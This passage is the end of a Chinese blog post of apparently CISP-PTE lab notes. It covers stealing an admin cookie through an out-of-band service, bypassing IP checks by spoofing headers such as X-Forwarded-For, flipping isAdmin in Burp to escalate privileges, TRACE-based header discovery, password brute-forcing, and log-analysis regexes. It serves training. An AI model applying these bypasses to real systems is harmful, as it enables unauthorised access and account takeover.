<p>然后在ceye中可以看到外带出来的cookie<br><img src="https://pic1.imgdb.cn/item/68c91229c5157e1a880ae5c4.png"><br>把这个cookie加入网站中就能在首页看到flag  cookie的name是session<br>第二题： 启动环境，想办法，要读取到管理员的cookie，﻿就能获得flag值了呢，<br>和上一题一样的payload  cookie就是flag</p>
<h2 id="业务逻辑漏洞"><a href="#业务逻辑漏洞" class="headerlink" title="业务逻辑漏洞"></a>业务逻辑漏洞</h2><p>第一题： 请根据提示获取flag<br><img src="https://pic1.imgdb.cn/item/68c91407c5157e1a880b01da.png"><br>开始后 首页提示需要本地访问  所以在modified header里面加上X-Forwarded-For : 127.0.0.1<br>下一步是要把guest用户越权到admin<br>打开burpsuite  把isAdmin修改成true 然后Username改成admin的base64编码<br><img src="https://pic1.imgdb.cn/item/68c9154ac5157e1a880b0851.png"><br>第二题：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">用户已经通过弱口令得知了用户名admin密码admin123 ，但是服务端却限制IP地址，该如何伪造地址。</span><br><span class="line">部分源码如下：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="variable">$cip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$cip</span> != <span class="string">&quot;1.2.3.4&quot;</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;非法IP地址，只有1.2.3.4才能访问！&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br></pre></td></tr></table></figure></div>
<p>根据题目意思 只要在请求头中加入Client-IP 1.2.3.4再登录就可以了<br><img src="https://s3.bmp.ovh/imgs/2025/09/16/3b55dcc89b2e8fc8.png"><br>第三题：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">访问网站 IP被限制，该如何绕过。</span><br><span class="line">部分源码如下：</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line"><span class="variable">$cip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$cip</span> == <span class="string">&quot;2.2.2.1&quot;</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;success&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;h2&gt;登录成功！&lt;/h2&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$flag</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;flag&#123;&#x27;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$flag</span>) . <span class="string">&#x27;&#125;&lt;/p&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;error&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;h2&gt;登录失败&lt;/h2&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;IP地址验证失败&lt;/p&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;当前IP: &#x27;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$cip</span>) . <span class="string">&#x27;&lt;/p&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>只要修改一个X-Forwarded-For就好了<br>第四题：<br>题目：Admin Panel 的隐秘后门<br>描述：你能发现管理员面板的隐藏访问方式吗？<br>目标：删除用户tom 获取 flag<br>进入题目后 进入admin panel<br><img src="https://s3.bmp.ovh/imgs/2025/09/16/ab6f089a98aa9501.png"><br>提示要管理员和本地访问 bp抓包之后发现修改isadmin 和 添加x-forwarded-for 不起作用<br>这题考察的是TRACE请求方式 通过这个方式发送后 会返回完整的请求包 在里面可以看到指定ip的字段 X-Custom-IP-Authorization<br>把username和isadmin像上面一样修改之后 在加上X-Custom-IP-Authorization: 127.0.0.1 就可以进入admin面板了<br>删除tom用同样的方式 请求方式改成post</p>
<h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><p>第一题：<br><img src="https://s3.bmp.ovh/imgs/2025/09/16/24164a8f865134b2.png"><br>用notepad打开 搜索中用正则表达式<code> ^172\.16\.12\.12.*&quot; 200 .*</code> 搜索以这个ip开头 访问状态码的所有内容<br><img src="https://s3.bmp.ovh/imgs/2025/09/16/9f7465a92cae2b87.png"><br>发现黑客多次访问adminlogin.php 猜测是密码爆破 用bp爆破admin密码 得到password123 登录后得到flag<br>第二题：<br><code>^.*&quot;[A-Z]+ /(?!/?(index|css|manage|upload|footer)).*\.(php|jsp\asp).*&quot; 200.*</code><br>用<code>[A-Z]</code>匹配请求方式 &#x2F;?是第二个可有可无的&#x2F;  排除一些常见的路径 匹配后缀 返回码要是200 的<br><img src="https://s3.bmp.ovh/imgs/2025/09/16/12e9a1930c7ed37e.png"><br>找到&#x2F;admin&#x2F;backdoor.php</p>

    </div>

    
    
    
        

<div>
<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者： </strong>guayu-kakeru
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="https://guayu-kakeru.github.io/posts/0.html" title="">https://guayu-kakeru.github.io/posts/0.html</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>


      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/posts/13378.html" rel="prev" title="cisp-pte客观题笔记">
      <i class="fa fa-chevron-left"></i> cisp-pte客观题笔记
    </a></div>
      <div class="post-nav-item">
    <a href="/posts/59614.html" rel="next" title="CISP-PTE综合题做题笔记">
      CISP-PTE综合题做题笔记 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86"><span class="nav-text">第一部分</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E5%A5%97%E9%A2%98%E7%9B%AE"><span class="nav-text">第一套题目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E5%A5%97%E9%A2%98%E7%9B%AE"><span class="nav-text">第二套题目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E5%A5%97%E9%A2%98%E7%9B%AE"><span class="nav-text">第三套题目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E5%9B%9B%E5%A5%97%E9%A2%98%E7%9B%AE"><span class="nav-text">第四套题目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%94%E5%A5%97%E9%A2%98%E7%9B%AE"><span class="nav-text">第五套题目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E5%85%AD%E5%A5%97%E9%A2%98%E7%9B%AE"><span class="nav-text">第六套题目</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86"><span class="nav-text">第二部分</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="nav-text">sql注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-text">文件上传</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-text">文件包含</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-text">代码审计</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-text">命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="nav-text">暴力破解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss"><span class="nav-text">xss</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="nav-text">业务逻辑漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="nav-text">日志分析</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="guayu-kakeru"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">guayu-kakeru</p>
  <div class="site-description" itemprop="description">一年过后，你会希望从今天就开始行动。</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">83</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">15</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">15</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/guayu-kakeru" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;guayu-kakeru" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="/1806449041@qq.com" title="E-Mail → 1806449041@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



  <div class="links-of-recent-posts motion-element">
    <div class="links-of-recent-posts-title">
      <i class="fa fa-history fa-fw"></i>
      最近文章
    </div>
    <ul class="links-of-recent-posts-list">
        <li class="links-of-recent-posts-item">
          <a href="/posts/36199.html" title="posts&#x2F;36199.html">vulnhub-Brainpan</a>
        </li>
        <li class="links-of-recent-posts-item">
          <a href="/posts/28301.html" title="posts&#x2F;28301.html">HMV-fuzzz复现</a>
        </li>
        <li class="links-of-recent-posts-item">
          <a href="/posts/59614.html" title="posts&#x2F;59614.html">CISP-PTE综合题做题笔记</a>
        </li>
        <li class="links-of-recent-posts-item">
          <a href="/posts/0.html" title="posts&#x2F;0.html"></a>
        </li>
        <li class="links-of-recent-posts-item">
          <a href="/posts/13378.html" title="posts&#x2F;13378.html">cisp-pte客观题笔记</a>
        </li>
    </ul>
  </div>
      </div>

      
      
        <div class="links-of-blogroll motion-element links-of-blogroll-undefined">
          <div class="links-of-blogroll-title">
            <i class="fa fa-history fa-" aria-hidden="true"></i>
            
          </div>
          <ul class="links-of-blogroll-list">
            
            
              <li class="recent_posts_li">
                <a href="/" title="" target="_blank"></a>
              </li>
            
              <li class="recent_posts_li">
                <a href="/" title="" target="_blank"></a>
              </li>
            
              <li class="recent_posts_li">
                <a href="/" title="" target="_blank"></a>
              </li>
            
              <li class="recent_posts_li">
                <a href="/" title="" target="_blank"></a>
              </li>
            
              <li class="recent_posts_li">
                <a href="/" title="" target="_blank"></a>
              </li>
            
          </ul>
        </div>
      
    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">guayu-kakeru</span>
</div>



        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

</body>
</html>
